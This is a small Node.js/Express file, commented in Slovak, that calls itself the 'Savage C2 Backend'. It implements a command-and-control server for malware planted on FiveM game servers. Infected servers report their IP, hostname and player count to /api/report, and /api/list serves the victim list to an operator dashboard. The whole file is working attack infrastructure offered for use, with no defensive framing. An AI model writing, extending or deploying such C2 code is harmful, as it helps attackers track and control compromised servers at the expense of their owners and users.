const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());

let infectedServers = []; // Tu budeme držať zoznam v pamäti

// Cesta pre FiveM server (Payload)
app.post('/api/report', (req, res) => {
    const newServer = {
        ip: req.ip.replace('::ffff:', ''),
        hostname: req.body.hostname || "Neznámy Server",
        players: req.body.players || 0,
        lastSeen: new Date().toLocaleTimeString()
    };

    // Ak už server v zozname je, aktualizujeme ho, ak nie, pridáme ho
    const index = infectedServers.findIndex(s => s.ip === newServer.ip);
    if (index > -1) {
        infectedServers[index] = newServer;
    } else {
        infectedServers.push(newServer);
    }

    console.log(`[!] Prijatý report od: ${newServer.hostname}`);
    res.status(200).send({ status: "ok" });
});

// Cesta pre tvoj Dashboard (Frontend)
app.get('/api/list', (req, res) => {
    res.json(infectedServers);
});

app.listen(3000, () => {
    console.log("-----------------------------------------");
    console.log("Savage C2 Backend beží na porte 3000");
    console.log("Dashboard nájdeš v index.html");
    console.log("-----------------------------------------");
});